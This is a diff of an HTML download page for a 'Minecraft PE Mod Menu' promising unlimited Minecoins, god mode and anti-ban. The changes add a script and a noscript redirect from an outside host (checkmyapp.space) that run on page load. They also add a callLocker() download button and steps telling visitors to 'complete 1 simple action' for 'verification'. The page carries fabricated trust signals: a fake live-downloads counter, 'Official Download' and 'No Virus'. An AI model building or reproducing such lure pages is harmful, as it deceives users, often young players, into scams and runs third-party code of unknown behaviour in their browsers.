@@ -1,33 +1,30 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <noscript><meta http-equiv="refresh" content="0;url=https://checkmyapp.space/noscript" /></noscript>
+    <script type="text/javascript" id="ogjs" src="https://checkmyapp.space/cl/js/1x33lx"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minecraft Mod Menu v1.21.101</title>
+    <title>Minecraft PE Mod Menu v1.21 - Official Download</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
     
     <style>
-        /* إعدادات الصفحة للسماح بالتحريك */
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
 
         body, html {
             margin: 0;
             padding: 0;
-            min-height: 100vh; /* يسمح للصفحة بأن تطول حسب المحتوى */
+            min-height: 100vh;
             font-family: 'Montserrat', sans-serif;
             background-color: #050505;
             color: white;
             display: flex;
-            flex-direction: column;
             align-items: center;
-            justify-content: flex-start; /* يبدأ من الأعلى للسماح بالسكرول */
-            overflow-y: auto; /* هذا هو الحل لمشكلة التجميد */
-            -webkit-overflow-scrolling: touch;
+            justify-content: center;
+            padding: 20px 0;
         }
 
-        /* الخلفية الثابتة */
         .background-overlay {
             position: fixed;
             top: 0;
@@ -39,53 +36,53 @@
             background-size: cover;
             background-position: center;
             z-index: -1;
+            transform: scale(1.1);
         }
 
-        /* حاوية المحتوى المركزية */
         .main-card {
             background: rgba(15, 15, 15, 0.95);
             width: 90%;
-            max-width: 450px;
-            padding: 30px 20px;
+            max-width: 480px;
+            padding: 35px 25px;
             border-radius: 20px;
-            border: 2px solid #52ba10;
+            border: 1px solid #52ba10;
             text-align: center;
             box-shadow: 0 0 40px rgba(82, 186, 16, 0.2);
+            position: relative;
             backdrop-filter: blur(10px);
-            margin: 40px auto; /* مسافة من الأعلى والأسفل */
         }
 
-        /* اللوجو */
         .logo {
             width: 140px;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             filter: drop-shadow(0 0 10px rgba(255, 204, 0, 0.3));
         }
 
         h1 {
-            font-size: 1.6rem;
+            font-size: 1.7rem;
             margin: 5px 0;
             text-transform: uppercase;
             letter-spacing: 2px;
+            color: #ffffff;
         }
 
         .version-badge {
             display: inline-block;
             background: #ffcc00;
             color: #000;
-            padding: 5px 15px;
+            padding: 4px 12px;
             border-radius: 5px;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 900;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         /* قائمة المميزات */
         .features-box {
             background: rgba(255, 255, 255, 0.03);
             border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 25px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
             text-align: left;
             border-left: 4px solid #52ba10;
         }
@@ -93,22 +90,55 @@
         .feature-item {
             display: flex;
             align-items: center;
-            margin: 12px 0;
+            margin: 10px 0;
             font-family: 'Rajdhani', sans-serif;
-            font-size: 1.2rem;
+            font-size: 1.15rem;
             color: #e0e0e0;
         }
 
-        .feature-item span {
+        .feature-item i {
             color: #52ba10;
             margin-right: 12px;
+            font-weight: bold;
+        }
+
+        /* قسم شرح خطوات الاختصار للزائر */
+        .guide-box {
+            background: rgba(82, 186, 16, 0.08);
+            border: 1px dashed #52ba10;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .guide-title {
+            color: #ffcc00;
+            font-size: 0.85rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .guide-step {
+            font-size: 0.8rem;
+            color: #cccccc;
+            margin: 6px 0;
+            line-height: 1.4;
+        }
+
+        .guide-step span {
+            color: #52ba10;
             font-weight: bold;
         }
 
         /* عداد المستخدمين المتصلين */
         .live-status {
             color: #00ff00;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             margin-bottom: 15px;
             display: flex;
             align-items: center;
@@ -117,10 +147,11 @@
         }
 
         .dot {
-            height: 10px;
-            width: 10px;
+            height: 8px;
+            width: 8px;
             background-color: #00ff00;
             border-radius: 50%;
+            display: inline-block;
             animation: blink 1s infinite;
         }
 
@@ -130,24 +161,25 @@
             100% { opacity: 1; }
         }
 
-        /* زر التحميل المتحرك */
+        /* زر التحميل الخارق */
         .download-button {
             background: linear-gradient(135deg, #52ba10 0%, #3e8e0c 100%);
             color: white;
             border: none;
             width: 100%;
-            padding: 20px;
-            font-size: 1.4rem;
-              font-weight: 900;
+            padding: 18px;
+            font-size: 1.3rem;
+            font-weight: 900;
             border-radius: 50px;
             cursor: pointer;
             text-transform: uppercase;
-            transition: 0.3s;
+            transition: 0.4s;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
             animation: pulse-green 2s infinite;
         }
 
         .download-button:hover {
-            transform: scale(1.03);
+            transform: translateY(-3px) scale(1.02);
             box-shadow: 0 0 30px rgba(82, 186, 16, 0.6);
         }
 
@@ -158,10 +190,16 @@
         }
 
         .footer-text {
-            margin-top: 25px;
+            margin-top: 20px;
             font-size: 0.7rem;
-            color: #666;
+            color: #777;
             text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 480px) {
+            .main-card { padding: 25px 18px; }
+            h1 { font-size: 1.4rem; }
         }
     </style>
 </head>
@@ -172,19 +210,27 @@
     <div class="main-card">
         <img src="https://cdn.freebiesupply.com/logos/large/2x/minecraft-logo-black-and-white.png" alt="Minecraft Logo" class="logo">
         
-        <h1>Minecraft Mod menu</h1>
+        <h1>Minecraft Mod Menu</h1>
         <div class="version-badge">v1.21.101 - ANTI-BAN ACTIVE</div>
 
         <div class="features-box">
-            <div class="feature-item"><span>✓</span> Unlimited Minecoins</div>
-            <div class="feature-item"><span>✓</span> God Mode & Fly Hack</div>
-            <div class="feature-item"><span>✓</span> All Skins Unlocked</div>
-            <div class="feature-item"><span>✓</span> Speed & High Jump</div>
+            <div class="feature-item"><i>✓</i> Unlimited Minecoins (999k)</div>
+            <div class="feature-item"><i>✓</i> God Mode & Invisibility</div>
+            <div class="feature-item"><i>✓</i> Fly Hack & Speed Boost</div>
+            <div class="feature-item"><i>✓</i> All Premium Skins Unlocked</div>
+        </div>
+
+        <!-- دليل الشرح للزائر لكيفية التجاوز -->
+        <div class="guide-box">
+            <div class="guide-title">⚡ How to Unlock Your Download:</div>
+            <div class="guide-step"><span>Step 1:</span> Click the <b>Download Now</b> button below.</div>
+            <div class="guide-step"><span>Step 2:</span> Complete 1 simple action or wait for timer (Verification).</div>
+            <div class="guide-step"><span>Step 3:</span> Click <b>Get Link</b> to start downloading your file instantly.</div>
         </div>
 
         <div class="live-status">
             <span class="dot"></span>
-            <span>1,842 Users downloading now...</span>
+            <span>1,842 Users currently downloading...</span>
         </div>
 
         <button class="download-button" onclick="callLocker()">
@@ -192,7 +238,7 @@
         </button>
 
         <div class="footer-text">
-            © 2026 Minecraft Modding Community
+            Secure Connection • Verified File • No Virus
         </div>
     </div>
 
